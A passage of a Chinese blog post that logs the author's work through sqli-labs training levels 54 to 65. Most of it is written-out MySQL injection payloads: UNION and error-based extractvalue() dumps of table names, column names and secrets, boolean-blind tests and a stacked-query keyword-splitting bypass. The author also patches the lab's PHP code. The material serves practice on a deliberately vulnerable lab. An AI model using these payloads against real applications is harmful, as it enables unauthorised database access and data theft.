+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">id=1  // id=1是存在的，如果不知道id为何值时是存在的，可以试试可能存在的值或者直接尝试整型或字符型注入</span><br><span class="line"></span><br><span class="line">// 根据id来查找数据（增删改查中的查）</span><br><span class="line">// 可以先假设一下sql语句，如 select * from a_table where id=$_GET[&#x27;id&#x27;] limit 0,1; 猜测一下程序把我们传进去的参数拼接在了什么位置（只是个大概，不一定准确）</span><br><span class="line"></span><br><span class="line">id=2  // id=2也是存在的，也可以不要这一步，看 id=2-1 结果和 id=1 相不相同</span><br><span class="line"></span><br><span class="line">id=2-1  // 此时页面和 id=2 时相同，基于 mysql 中字符串和整型比较时的结果，我们可以知道 2-1 很大可能被作为字符串拼接在 sql 语句中（引号包裹），也不排除数据库里id为字符型，刚好有一条记录id是 &#x27;2-1&#x27; ，可以多试几个</span><br><span class="line"></span><br><span class="line">id=-1  // 用于判断是否有mysql的报错信息，要结合后面的</span><br><span class="line"></span><br><span class="line">id=1&#x27;  // 判断单引号还是双引号包裹，页面没有显示信息，可能就是单引号包裹并且没有报错信息</span><br><span class="line"></span><br><span class="line">id=1&quot;  // 与id=1页面相同，结合之前的，大概率是单引号包裹的</span><br><span class="line"></span><br><span class="line">// 以上只能初步判断，搞不好就有那种特别离谱的数据库，但都到这了，不妨接着试一试</span><br><span class="line"></span><br><span class="line">id=1&#x27; order by 1--+  // 有信息，之后可以用二分法判断查询了多少列，order by 3没问题，order by 4有问题，所以 3 的时候sql语句正常，而 4 不正常，所以只查询了 3 列</span><br><span class="line"></span><br><span class="line">id=&#x27;union select 1,2,3--+  // 知道了查询三列，就可以试试联合查询，注意 单引号前面的 1 不要了，不然如果网页只能回显一行，我们的1，2，3就显示不出来了。观察网页，我们发现有2，3这两个回显点，而且这时候我们能够确定真的存在sql注入</span><br></pre></td></tr></table></figure>
+
+<p>注入点和回显点都确定了，数据库名也知道了，直接查有哪些表，列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;challenges&#x27;--+  // 查表名</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;lc7tl44y41&#x27;--+  // 查列名  id,sessid,secret_ZJSK,tryy</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,group_concat(concat_ws(&#x27;^^&#x27;,id,sessid,secret_ZJSK,tryy) separator &#x27;/\\&#x27;),3 from lc7tl44y41--+  // 我们自己指定一下分隔符，不然默认都是逗号，group_concat 和 concat_ws 指定分隔符的方法有一点点不一样</span><br></pre></td></tr></table></figure>
+
+<p>查出来只有一行 secret_ZJSK 这个字段应该就是他想要我们找的</p>
+<h1 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error in function next_tryy()You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;7e8cvw0olr SET tryy=tryy+1 WHERE id=1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>人麻了，最恐怖的是我试了一下 less-54 也这样了</p>
+<p><del>可能是 7e8cvw0olr 和什么mysql中的关键字冲突了</del> 后来感觉像是 7e8 被当成了科学计数法</p>
+<p>修改一下sql-connections&#x2F;functions.php，79行，next_tryy函数中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE $table SET tryy=tryy+1 WHERE id=1&quot;;</span><br><span class="line"></span><br><span class="line">=&gt;$sql = &quot;UPDATE `$table` SET tryy=tryy+1 WHERE id=1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>在 $table 两端加上反引号，表示这只是一个用户定义的标识符</p>
+<p>还有第87行，view_attempts函数中，改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT tryy FROM `$table` WHERE id=1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>也是加上反引号</p>
+<p>正常了我超</p>
+<p>寻找注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br><span class="line"></span><br><span class="line">id=2</span><br><span class="line"></span><br><span class="line">id=2-1  // 这次和 id=1 的页面相同，大概率是整型注入</span><br><span class="line"></span><br><span class="line">id=1 order by 1--+  // 没反应，有可能是括号括起来了</span><br><span class="line"></span><br><span class="line">?id=1) order by 1--+  // 可以了，还是二分法测试查询了多少列（仍是3列）</span><br><span class="line"></span><br><span class="line">?id=-1) union select 1,2,3--+  // 空字符串换成 -1，一样的目的，为了让原本的查询查不出数据，-1不行就换成一些更离谱的值，或者加上 and 1=2，仍是2，3回显</span><br></pre></td></tr></table></figure>
+
+<p>其实和 54 差不多，接下来就基本一样了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;challenges&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><del>没显示值，可能是过滤了引号，使用16进制绕过</del></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6368616c6c656e676573</span><br></pre></td></tr></table></figure>
+
+<p>我括号忘记加上了，没过滤引号。。。直接从 54 复制过来的，改一下比较快</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;challenges&#x27;--+  // t89wk1bnp6</span><br><span class="line"></span><br><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;t89wk1bnp6&#x27;--+  // id,sessid,secret_PQ3L,tryy</span><br><span class="line"></span><br><span class="line">?id=-1) union select 1,group_concat(concat_ws(&#x27;^^&#x27;,id,sessid,secret_PQ3L,tryy) separator &#x27;/\\&#x27;),3 from t89wk1bnp6--+</span><br></pre></td></tr></table></figure>
+
+<p>搞定了</p>
+<h1 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h1><p>流程和上面差不多了，直接写结果吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;) union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">?id=&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;challenges&#x27;--+  // ofhhs227x3</span><br><span class="line"></span><br><span class="line">?id=&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;ofhhs227x3&#x27;--+  // id,sessid,secret_1V1K,tryy</span><br><span class="line"></span><br><span class="line">?id=&#x27;) union select 1,group_concat(concat_ws(&#x27;^^&#x27;,id,sessid,secret_1V1K,tryy) separator &#x27;/\\&#x27;),3 from ofhhs227x3--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h1><p>经典 单引号 换成 双引号</p>
+<p>下一个</p>
+<h1 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h1><p>可查询的次数更少了</p>
+<p>尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>时，结果和 id&#x3D;1 时一样，双引号没结果，不知道为什么</p>
+<p>把 联合查询的第一个值改为 2 ，结果也会变为 id&#x3D;2 的结果</p>
+<p>。。。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">array_reverse</span>(<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
+
+<p>原来是他这用户密码是乱给的，我就说我密码全改 123 了怎么不太对</p>
+<p>但我尝试 单引号 的时候已经发现了有报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;</span><br><span class="line"></span><br><span class="line">?id=&#x27; or extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;)))--+  // xen80ozgy3</span><br><span class="line"></span><br><span class="line">?id=&#x27; or extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;xen80ozgy3&#x27;)))--+  //  id,sessid,secret_VBW6,tryy</span><br><span class="line"></span><br><span class="line">// 报错信息好像有长度限制，所以只查一列</span><br><span class="line">?id=&#x27; or extractvalue(0x0a,concat(0x0a,(select group_concat(secret_VBW6) from xen80ozgy3)))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h1><p>数字型注入</p>
+<p>他用户密码好像还是乱给的，报错注入还是可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 or extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;)))--+  // 7fewsuclfg</span><br><span class="line"></span><br><span class="line">?id=-1 or extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;7fewsuclfg&#x27;)))--+  // secret_UR5U</span><br><span class="line"></span><br><span class="line">?id=-1 or extractvalue(0x0a,concat(0x0a,(select group_concat(secret_UR5U) from 7fewsuclfg)))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h1><p>双引号加圆括号闭合，试双引号的时候报错直接把括号爆出来了</p>
+<p>联合查询依然没用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) or extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;)))--+  // 8jukx7vl5t</span><br><span class="line"></span><br><span class="line">?id=1&quot;) or extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;8jukx7vl5t&#x27;)))--+  // secret_OBM5</span><br><span class="line"></span><br><span class="line">?id=1&quot;) or extractvalue(0x0a,concat(0x0a,(select group_concat(secret_OBM5) from 8jukx7vl5t)))--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h1><p>单引号，两个括号，报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error in function column_name()You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;66e8dbfgkg WHERE id=1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>给爷整无语了，再改</p>
+<p> 第63行，这种列名表名都用反引号括起来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)) or extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;)))--+  // 66e8dbfgkg</span><br><span class="line"></span><br><span class="line">?id=&#x27;)) or extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;challenges&#x27; and table_name=&#x27;66e8dbfgkg&#x27;)))--+  // secret_BISU</span><br><span class="line"></span><br><span class="line">?id=&#x27;)) or extractvalue(0x0a,concat(0x0a,(select group_concat(secret_BISU) from `66e8dbfgkg`)))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>破案了，之前一直有的时候，感觉没问题的突然就给我报语法错误，可能也是关键字冲突了</p>
+<h1 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h1><p>给 130 次机会应该是要盲注了</p>
+<p>可以用布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;) union select if(1=2,1,-1),2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap 不知道行不行</p>
+<p>sql布尔盲注注到一半重置了，会得到错误的结果</p>
+<p>而且因为有缓存，他拒绝重新注入一遍</p>
+<p>缓存数据好像用的是 sqlite ，我没用过奥</p>
+<p>有机会自己写个脚本吧</p>
+<h1 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h1><p>好像还是可以布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select if(1=1,1,-1),2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h1><p>好像还是可以布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)) union select if(1=2,1,-1),2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h1><p>测试有没有括号的时候可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>然后在双引号后面加 ) 括号，有信息显示就代表没有语法错误</p>
+<p>好像还是布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&quot;) union select if(1=1,1,-1),2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="结束了"><a href="#结束了" class="headerlink" title="结束了"></a>结束了</h1><p>less-66 以后的都没了，只有链接没有文件，github上面的也没有，应该不是我的问题吧</p>
+<p>网上有说一些关卡要用到tomcat，源码里确实有个 tomcat-files.zip，里面是 29-32 的 jsp 文件，但29-32也有php写的，不知道有没有什么区别，jsp没学过，好像和 java 有关</p>
+<p>堆叠注入加上预编译绕过过滤还没用上，放一段吧（网上看来的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @a=concat(&#x27;...&#x27;,&#x27;...&#x27;);prepare ins from @a;execute ins;</span><br><span class="line"></span><br><span class="line">可以把关键字，如 select 拆开，拆成 sel和ect，然后再拼起来</span><br><span class="line">可以绕过那种递归替换的（无法用双写绕过）。需要堆叠注入</span><br></pre></td></tr></table></figure>
+
+<p> sqli-labs在github上面的最后更新时间还是 2014 年。现在 php7 中删去了 mysql_ 开头的函数，可以用mysqli_ 开头的函数替代（如果想用 php7 而不是php5 的话），github上面好像有人改成了php7可以使用的版本（不止一个）。网上还有教在linux下用shell脚本把源码中的 mysql_ 全部替换成 mysqli_ 的，据说也可以</p>
+<p>但我用phpstudy 可以切换php的版本（感觉这样比较灵活）</p>
+<p>盲注脚本以后再补（有机会的话）</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://x4297.github.io">x4297</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/">https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://x4297.github.io" target="_blank">x4297's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/Yuumi.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2022/01/14/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" title="使用hexo搭建博客"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">使用hexo搭建博客</div></div><div class="info-2"><div class="info-item-1">本文记录了如何在windows系统中使用hexo搭建博客，并部署到github pages 安装 git 和 node.jsgit可以在国内镜像下载，以下为清华大学开源软件镜像站git的下载地址 https://mirrors.tuna.tsinghua.edu.cn/github-release/git-for-windows/git/ 使用 git bash 可以在 windows 上使用 linux 的命令 在node.js官网下载安装包，下载速度还行，安装时使用默认配置 使用 node -v 查看node.js版本，使用npm -v 查看npm（Node Package Manager）版本，验证是否安装成功  安装hexo国外的源一般都比较慢，所以先给npm换源（淘宝源） 1npm config set registry https://registry.npm.taobao.org  另一种换源方法是使用cnpm 1npm install -g cnpm...</div></div></div></a><a class="pagination-related" href="/2022/01/27/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/" title="用php写一个简易留言板"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">用php写一个简易留言板</div></div><div class="info-2"><div class="info-item-1">环境phpstudy  php 7.3.4  nginx 1.15.11  mysql 5.7.26  bootstrap 5.1.3   index.php我们需要一个表单，以及展示之前留言的地方 前端不是重点（因为基本不会），所以简单点 表单 form，将数据提交到 .&#x2F;submit.php 中，前端加几个简单的验证（required表示不能为空） 12345678910&lt;form action=&quot;./submit.php&quot; method=&quot;post&quot;&gt;        &lt;label&gt;Name:             &lt;input name=&quot;name&quot; autocomplete=&quot;name&quot; required=&quot;required&quot;&gt;        &lt;/label&gt;        &lt;br/&gt;        &lt;label&gt;Message:             &lt;textarea...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Yuumi.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">x4297</div><div class="author-info-description">开摆!</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/x4297"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">你爸拿了MVP!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#less-1"><span class="toc-number">1.</span> <span class="toc-text">less-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-2"><span class="toc-number">2.</span> <span class="toc-text">less-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-3%EF%BC%88%E6%8B%AC%E5%8F%B7%E5%8C%85%E8%A3%B9%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">less-3（括号包裹）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-4"><span class="toc-number">4.</span> <span class="toc-text">less-4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-5%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">less-5（报错注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-6"><span class="toc-number">6.</span> <span class="toc-text">less-6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-7%EF%BC%88outfile%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">less-7（outfile）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-8%EF%BC%88sqlmap-blind%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">less-8（sqlmap blind）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-9"><span class="toc-number">9.</span> <span class="toc-text">less-9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-10"><span class="toc-number">10.</span> <span class="toc-text">less-10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-11"><span class="toc-number">11.</span> <span class="toc-text">less-11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-12"><span class="toc-number">12.</span> <span class="toc-text">less-12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-13"><span class="toc-number">13.</span> <span class="toc-text">less-13</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-14"><span class="toc-number">14.</span> <span class="toc-text">less-14</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-15%EF%BC%88sqlmap-post%EF%BC%89"><span class="toc-number">15.</span> <span class="toc-text">less-15（sqlmap post）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-16"><span class="toc-number">16.</span> <span class="toc-text">less-16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-17%EF%BC%88blind-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">17.</span> <span class="toc-text">less-17（blind&amp;二次注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-18%EF%BC%88User-Agent%EF%BC%89"><span class="toc-number">18.</span> <span class="toc-text">less-18（User-Agent）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-19"><span class="toc-number">19.</span> <span class="toc-text">less-19</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-20"><span class="toc-number">20.</span> <span class="toc-text">less-20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-21"><span class="toc-number">21.</span> <span class="toc-text">less-21</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-22"><span class="toc-number">22.</span> <span class="toc-text">less-22</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-23%EF%BC%88%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6%EF%BC%89"><span class="toc-number">23.</span> <span class="toc-text">less-23（过滤注释符）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-24%EF%BC%88%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">24.</span> <span class="toc-text">less-24（二次注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-25%EF%BC%88%E8%BF%87%E6%BB%A4-and-%E5%92%8C-or%EF%BC%8C%E5%A4%A7%E5%B0%8F%E5%86%99%E4%B8%8D%E6%95%8F%E6%84%9F%EF%BC%8Ctamper%EF%BC%89"><span class="toc-number">25.</span> <span class="toc-text">less-25（过滤 and 和 or，大小写不敏感，tamper）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-25a"><span class="toc-number">26.</span> <span class="toc-text">less-25a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-26%EF%BC%88%E8%BF%87%E6%BB%A4%E7%A9%BA%E7%99%BD%E3%80%81-%E3%80%81%E6%B3%A8%E9%87%8A%EF%BC%89"><span class="toc-number">27.</span> <span class="toc-text">less-26（过滤空白、&#x2F;**&#x2F;、注释）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E7%99%BD%E8%BF%87%E6%BB%A4"><span class="toc-number">28.</span> <span class="toc-text">绕过空白过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%94%A8-%E4%BB%A3%E6%9B%BF"><span class="toc-number">28.1.</span> <span class="toc-text">1、用 &#x2F;**&#x2F; 代替</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%9C%86%E6%8B%AC%E5%8F%B7"><span class="toc-number">28.2.</span> <span class="toc-text">2、圆括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number">28.3.</span> <span class="toc-text">3、反引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E4%B8%80%E7%A7%8Dmysql%E4%B8%AD%E6%AF%94%E8%BE%83%E7%89%B9%E6%AE%8A%E7%9A%84%E6%B3%A8%E9%87%8A"><span class="toc-number">28.4.</span> <span class="toc-text">4、一种mysql中比较特殊的注释</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-26a"><span class="toc-number">29.</span> <span class="toc-text">less-26a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-27%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86%E4%BD%86%E6%98%AF%E5%A4%A7%E5%B0%8F%E5%86%99%E6%95%8F%E6%84%9F%EF%BC%89"><span class="toc-number">30.</span> <span class="toc-text">less-27（过滤了但是大小写敏感）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-27a"><span class="toc-number">31.</span> <span class="toc-text">less-27a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-28"><span class="toc-number">32.</span> <span class="toc-text">less-28</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-28a"><span class="toc-number">33.</span> <span class="toc-text">less-28a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 